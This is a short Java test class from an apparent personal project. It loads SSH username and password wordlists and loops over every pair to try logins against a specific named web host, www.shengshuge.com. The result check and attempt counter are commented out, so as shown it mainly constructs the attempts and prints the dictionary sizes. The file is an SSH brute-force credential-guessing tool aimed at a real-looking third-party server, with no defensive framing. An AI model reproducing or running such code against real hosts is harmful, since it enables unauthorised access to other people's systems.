package test;

import pers.badger.FileIO.LoadDicFile;
import pers.badger.server.SshTry;

import java.util.ArrayList;

/**
 * Created by badger on 2017/3/11.
 */
public class TestSshScan {
    public static void main(String[] args) {
        new TestSshScan().process();
    }

    public void process() {

        ArrayList<String> userDic = new LoadDicFile("dic/ssh/user").getFileLines();
        ArrayList<String> passDic = new LoadDicFile("dic/ssh/1pass00.txt").getFileLines();

        int times = 0;

        fullTry:
        for (String userName : userDic) {
            for (String password : passDic) {

                SshTry sshTry = new SshTry("www.shengshuge.com", userName, password);

//                if (tryServer(userName, password)) {
//                    System.out.println("\tsuccess!");
//                    break fullTry;
//                } else {
//                    System.out.println("\tfailed!");
//                    times++;
//                }
            }
        }

        System.out.println("用户字典：" + userDic.size() + "个用户");
        System.out.println("密码字典：" + passDic.size() + "个密码");
        System.out.println("尝试" + times + "次");
    }

//
//    private boolean tryServer(String userName, String password) {
//        System.out.print("user:" + userName + "\tpass:" + password);
//        return sshTry.tryOnce();
//    }

}